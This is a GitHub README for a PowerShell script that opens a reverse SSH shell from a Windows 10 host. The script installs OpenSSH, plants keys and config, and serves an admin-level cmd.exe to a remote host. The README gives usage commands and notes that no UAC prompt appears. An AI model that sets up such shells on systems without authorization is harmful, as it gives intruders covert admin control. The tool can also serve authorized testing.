# lol-reverseSSHell.ps1
Living Off the LAN - Reverse SSHell

This script is intended to make SSH reverse shells easier to initiate on Windows 10. It utilizes OpenSSH Server (instead of NetCat / NCat) to forward a CMD.exe shell. If OpenSSH Server is missing from the Windows 10 host, the script will install it via WindowsCapability / DISM. ( * If OpenSSH server is missing, the script will ask to install it, then download OpenSSH Server from Microsoft.) Then the script will copy the sshd_config file, ssh private key, and authorized_keys files from the repo's root to the proper locations on the Windows host. Finally it creates a reverse SSH connection. The shell served is CMD.exe by default. Once you're in the cmd.exe cli, you can type 'powershell' to get a PS cli/shell. 

* Please generate NEW SSH KEYs. Use the repo's keys only for testing. 

Usage: 
* .\lol-reverseSSHell.ps1 -DestinationUserName `<user>` -DestinationHost `<IP Address>`
* .\lol-reverseSSHell.ps1 -DestinationUserName aj -DestinationHost 10.10.10.10 -DestinationPort 22 -DestinationBindLocalPort 7777 -InstallOpenSSHServer yes 
  - -OR- 
* Double Click .bat file and enter requested information.

Setup Instructions for SSH Keypairs and Help Documentation: 
* get-help .\lol-reverseSSHell.ps1 
* get-help .\lol-reverseSSHell.ps1 -Examples

Remote cmd.exe in a bash terminal via ssh: 
![alt text](https://github.com/ArronJablonowski/lol-reverseSSHell/blob/main/image.png?raw=true)
Remotely executing commands via cmd.exe and powershell.exe:  
![alt text](https://github.com/ArronJablonowski/lol-reverseSSHell/blob/main/image02.png?raw=true)

Windows vs Unix Reverse SSH Shells, & the Interesting Security Implications for Windows Users
-----------------------------------------------------------------------------------------------   
* Admin Privleges - Because the shell is ran using admin privleges, and most Windows users run as privleged users, the shell will have admin privleges without ever needing to know the admin password. After a shell has been initiated, there are no password prompts or UAC alerts to prevent commands from being ran with elevated privleges. Almost equivlent to a root shell in Unix. Which means you can browse the entire file system and modify system files without permissions issues.  

